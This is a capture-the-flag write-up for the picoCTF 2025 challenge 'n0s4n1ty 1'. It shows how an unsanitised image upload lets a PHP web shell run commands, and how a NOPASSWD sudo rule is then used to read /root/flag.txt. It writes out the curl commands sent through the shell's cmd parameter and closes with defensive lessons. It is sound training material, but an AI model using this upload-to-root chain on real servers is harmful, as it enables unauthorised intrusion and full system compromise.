# picoCTF 2025 - n0s4n1ty 1 Writeup

## Challenge Information

* **Challenge:** n0s4n1ty 1
* **Category:** Web Exploitation
* **Difficulty:** Easy
* **Platform:** picoCTF 2025
* **Author:** Prince Niyonshuti N.

---

# Objective

A website contains a profile picture upload feature with an insecure implementation. The goal is to exploit the upload functionality to gain command execution and retrieve the hidden flag stored in the `/root` directory.

---

# Reconnaissance

The challenge description mentions a profile picture upload feature. The first step was inspecting the upload functionality and identifying whether uploaded files were properly validated.

The provided hint stated:

```
File upload was not sanitized
```

This suggested that the application might allow uploading executable files instead of restricting uploads to valid image formats.

---

# Exploiting the File Upload

The upload functionality allowed a PHP file to be uploaded without proper validation.

By uploading a PHP web shell, it was possible to execute commands remotely through the uploaded file.

The web shell accepted commands through the `cmd` parameter:

```text
/uploads/test.php?cmd=<command>
```

To verify command execution:

```bash
curl "http://n0s4n1ty-1.picoctf.net:<PORT>/uploads/test.php?cmd=whoami" -o out.bin
```

The response contained the original image data along with the command output, so the output was not directly readable.

To extract readable information:

```bash
strings out.bin
```

The output contained:

```text
www-data
```

This confirmed that arbitrary commands were executing on the target system as the `www-data` user.

---

# Privilege Escalation

The second hint suggested checking sudo permissions:

```
Whenever you get a shell on a remote machine, check sudo -l
```

I executed:

```bash
curl "http://n0s4n1ty-1.picoctf.net:<PORT>/uploads/test.php?cmd=sudo%20-l" -o out.bin
```

Extracting the output:

```bash
strings out.bin
```

revealed:

```text
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```

This configuration means that `www-data` can execute any command with root privileges without requiring a password.

---

# Reading the Flag

Since `www-data` had unrestricted sudo permissions, I used sudo to read the flag file:

```bash
curl -i "http://n0s4n1ty-1.picoctf.net:<PORT>/uploads/test.php?cmd=sudo%20cat%20/root/flag.txt" -o out.bin
```

Because the response still contained binary image data, I extracted the printable strings:

```bash
strings out.bin
```

The flag appeared in the output.

To extract it cleanly:

```bash
strings out.bin | grep -oP 'picoCTF\{.*?\}'
```

---

# Flag

```
picoCTF{FLAG_HERE}
```

---

# Lessons Learned

* File upload functionality must properly validate file types and contents.
* Client-side restrictions or file extensions alone are not sufficient security controls.
* Arbitrary file upload vulnerabilities can lead directly to remote code execution.
* After obtaining command execution, privilege enumeration should always be performed.
* Misconfigured sudo permissions such as:

```text
(ALL) NOPASSWD: ALL
```

allow complete system compromise by granting unrestricted root access.

